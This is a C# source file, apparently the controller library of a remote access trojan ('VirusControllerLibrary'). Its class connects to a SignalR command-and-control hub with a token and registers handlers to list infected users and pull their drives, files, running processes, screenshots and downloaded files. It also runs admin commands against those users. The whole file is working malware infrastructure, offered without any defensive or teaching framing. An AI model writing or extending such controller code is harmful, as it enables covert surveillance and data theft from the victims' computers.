using Microsoft.AspNetCore.SignalR.Client;
using SerializableObjectsLibrary;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class ServerAdminConnection
    {
        public IReadOnlyCollection<AdminHubCommand> Commands => _commands.AsReadOnly();
        private List<AdminHubCommand> _commands = new List<AdminHubCommand>();
        public IReadOnlyCollection<ConnectedUser> ConnectedUsers => _connectedUsers.AsReadOnly();
        /// <summary>
        /// ОБЯЗАТЕЛЬНО ПОФИКСИТЬ, СДЕЛАТЬ ДОСТУПНЫМ ТОЛЬКО ДЛЯ ЧТЕНИЯ
        /// </summary>
        public List<ConnectedUser> _connectedUsers = new List<ConnectedUser>();

        public event Action OnSuccessHubConnection;
        public event Action OnStopHubConnection;
        public Action<IReadOnlyCollection<ConnectedUser>> OnGetConnectedUsersList;

        public Action<ConnectedUser> OnNewConnectionUser;
        public Action<ConnectedUser> OnUserDisconnect;

        public Action<List<string>> OnGetDrives;
        public Action<List<string>> OnGetFiles;
        public Action<List<string>> OnGetRunningProcesses;
        public Action<string> OnGetProcessingInfo;

        public Action<byte[]> OnGetScreenshot;

        public Action<string> OnNotification;
        public Action<string> OnError;

        public Action<byte[], string, string> OnGetDownloadFile;

        private readonly string _assessToken;
        private readonly Uri _serverUri;
        private readonly Uri _authorizationUri;
        private readonly Uri _hubUri;
        private readonly HubConnection _hubConnection;

        public ServerAdminConnection(Uri serverUri, Uri hubUri, string username, string password)
        {
            if (hubUri is null)
                throw new ArgumentNullException("hub path is null", nameof(hubUri));
            if (string.IsNullOrEmpty(username))
                throw new ArgumentNullException("username is null", nameof(username));
            if(string.IsNullOrEmpty(password))
                throw new ArgumentNullException("password is null", nameof(password));

            _serverUri = serverUri;
            _hubUri = hubUri;
            _authorizationUri = new Uri(_serverUri.ToString() + "Account/CreateToken/");

            _assessToken = new AuthorizationRequest(_authorizationUri)
                .AuthorizeWithTokenAsync(username, password).Result;

            _hubConnection = new HubConnectionBuilder()
                .WithUrl(_hubUri, options =>
                    options.AccessTokenProvider = () => Task.FromResult(_assessToken))
                .WithAutomaticReconnect()
                .Build();
        }

        public ServerAdminConnection(Uri serverUri, Uri hubUri, string username, string password,
            Action<IReadOnlyCollection<ConnectedUser>> onGetConnectedUsersList,
            Action<string> onNotification,
            Action<ConnectedUser> onNewConnectionUser,
            Action<ConnectedUser> onUserDisconnect,
            Action<List<string>> onGetDrives,
            Action<List<string>> onGetFiles,
            Action<List<string>> onGetRunningProcesses,
            Action<byte[], string, string> onGetDownloadFile,
            Action<string> onGetProcessingInfo,
            Action<byte[]> onGetScreenshot
            )
            : this(serverUri, hubUri, username, password)
        {
            OnNotification = onNotification;
            OnGetConnectedUsersList = onGetConnectedUsersList;
            OnNewConnectionUser = onNewConnectionUser;
            OnUserDisconnect = onUserDisconnect;
            OnGetDrives = onGetDrives;
            OnGetFiles = onGetFiles;
            OnGetRunningProcesses = onGetRunningProcesses;
            OnGetDownloadFile = onGetDownloadFile;
            OnGetProcessingInfo = onGetProcessingInfo;
            OnGetScreenshot = onGetScreenshot;
        }

        public async Task ConnectToHub()
        {
            _hubConnection.On("OnNotification", OnNotification);

            _hubConnection.On("OnGetProcessingInfo", OnGetProcessingInfo);

            _hubConnection.On<List<ConnectedUser>>("OnGetAllConnectedUsers", OnGetAllConnectedUsers);
            _hubConnection.On("OnNewConnectionUser", OnNewConnectionUser);
            _hubConnection.On("OnUserDisconnect", OnUserDisconnect);

            _hubConnection.On("OnGetDrives", OnGetDrives);
            _hubConnection.On("OnGetFiles", OnGetFiles);
            _hubConnection.On("OnGetRunningProcesses", OnGetRunningProcesses);

            _hubConnection.On("OnGetDownloadFile", OnGetDownloadFile);

            _hubConnection.On("OnGetScreenshot", OnGetScreenshot);

            await _hubConnection.StartAsync();
            OnSuccessHubConnection?.Invoke();
        }

        private void OnGetAllConnectedUsers(List<ConnectedUser> connectedUsers)
        {
            _connectedUsers = connectedUsers;
            OnGetConnectedUsersList?.Invoke(ConnectedUsers);
        }

        public async Task StopAsync()
        {
            await _hubConnection.StopAsync();
            OnStopHubConnection?.Invoke();
        }

        public async Task ExecuteCommandAsync(AdminHubCommand adminCommand)
        {
            adminCommand.SetHubConnection(_hubConnection);
            await adminCommand.ExecuteAsync();
        }
    }
}
